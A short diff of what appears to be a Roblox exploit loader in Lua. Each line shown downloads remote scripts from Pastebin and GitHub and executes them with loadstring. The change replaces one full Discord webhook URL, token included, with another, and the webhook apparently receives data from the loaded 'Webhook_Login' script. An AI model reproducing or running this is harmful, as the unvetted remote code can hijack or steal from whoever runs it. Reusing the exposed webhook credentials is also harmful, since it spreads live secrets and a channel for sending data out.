@@ -1,5 +1,5 @@
 local key = loadstring(game:HttpGet("https://pastebin.com/raw/Ab3e8maX"))()
-getgenv().webhooklink = "https://discord.com/api/webhooks/1091461909204717641/WWKO_ms84Fs3jGZWpVTMSfggsm07tJ-et6M4cnMQ2TiKMDaPdPhuMmO8m3HVDsHj6PAD"
+getgenv().webhooklink = "https://discord.com/api/webhooks/1091465287720763512/Vrcobl1JEaj5u7ysexI6dzquul8Gf7e8AQDctX4HKBxQ_z4TRbhcYW-j2AYcaX2-GC90"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub/main/SoraHub_Webhook_Login.lua"))()
 
